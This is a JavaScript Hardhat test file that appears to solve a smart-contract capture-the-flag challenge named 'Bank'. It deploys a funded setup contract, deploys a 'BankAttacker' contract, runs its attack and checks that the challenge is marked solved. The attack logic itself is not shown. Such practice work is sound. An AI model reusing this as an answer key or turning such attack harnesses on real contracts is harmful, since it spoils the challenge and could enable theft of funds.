const { expect } = require("chai");

describe("Bank", function() {
  it("Solve Bank", async function() {
    const signers = await ethers.getSigners();
    const user = signers[0]

    // Setup question
    const BankSetup = await ethers.getContractFactory("BankSetup");
    const setup = await BankSetup.deploy({
      value: ethers.utils.parseEther("50"),
    });
    await setup.deployed();
    expect(await setup.isSolved.call()).to.be.false;
    console.log("Depoly setup address: %s", setup.address)

    const Bank = await ethers.getContractFactory("Bank");
    const bank = Bank.attach(await setup.bank.call())
    console.log("Get bank address: %s", bank.address)

    const BankAttacker = await ethers.getContractFactory("BankAttacker");
    const attacker = await BankAttacker.deploy(bank.address);
    await attacker.deployed();
    console.log("Deploy attacker address: %s", attacker.address)

    console.log("Execute attack")
    await attacker.attackBank({from: user.address});
    expect(await setup.isSolved.call()).to.be.true;
    console.log("bank is solved:", await setup.isSolved.call())
  });
});
